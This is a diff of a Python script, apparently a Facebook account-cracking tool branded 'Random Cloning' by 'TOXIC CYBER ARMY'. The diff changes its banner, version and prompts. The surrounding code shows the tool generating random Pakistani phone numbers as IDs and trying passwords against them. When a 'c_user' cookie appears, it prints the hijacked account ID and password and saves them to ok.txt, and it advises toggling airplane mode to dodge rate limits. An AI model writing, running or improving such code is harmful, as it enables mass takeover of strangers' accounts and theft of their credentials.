@@ -116,16 +116,16 @@ def jalan(z):
         time.sleep(0.01)
 
 
-logo = """\t\x1b[1;97m888888  dP"Yb  Yb  dP 88  dP""b8  
-\t\x1b[1;97m 88   dP   Yb  YbdP  88 dP   `" 
-\t\x1b[1;97m88   Yb   dP  dPYb  88 Yb   
-\t\x1b[1;97m88    YbodP  dP  Yb 88 
+logo = """\t\x1b[1;97m#########   
+\t\x1b[1;97m  ##|:+:|## 
+\t\x1b[1;97m ##(o:o)## 
+\t\x1b[1;97m###(:)###
 \033[1;97m===============================================================
-\033[1;37m[-] TOOLS     :\033[1;32m Random-Crack
-\033[1;37m[-] VERSION   :\033[1;32m V.1.0
+\033[1;37m[-] TOOLS     :\033[1;32m Random Cloning 
+\033[1;37m[-] VERSION   :\033[1;32m V.0.1
 \033[1;37m[-] AUTHOR    :\033[1;32m Nil-Choudhury
 \033[1;37m[-] GITHUB    :\033[1;32m Nil-500
-\033[1;37m[-] TEAM      :\033[1;32m TOXIC
+\033[1;37m[-] TEAM      :\033[1;32m TOXIC CYBER ARMY 
 \033[1;97m===============================================================
 '\33[1;97mTurn on & off flight (airplane) mode before use   
 \033[1;97m==============================================================="""
@@ -150,9 +150,9 @@ def random_pak_number():
     user = []
     os.system('clear')
     print(logo)
-    print('[+] For Pak Enter Four Digit Code [92301] [92302] [92305] [92306]')
+    print('[+] For Pak Enter Four Digit Code (92301)')
     kode = input('[?] Input Code : ')
-    limit = int(input('How many numbers do you want to add simple 5000,10000,50000? '))
+    limit = int(input('How many numbers do you want to add ? '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
@@ -1258,7 +1258,7 @@ def rcrack(uid, pwx, tl):
             if 'c_user' in log_cookies:
                 coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\33[1;92m[Fire-Now] ' + cid + ' | ' + ps + '\33[0;97m')
+                print('\33[1;92m[Successful] ' + cid + ' | ' + ps + '\33[0;97m')
                 cek_apk(session, coki)
                 open('ok.txt', 'a').write(cid + ' | ' + ps + '\n')
                 oks.append(cid)
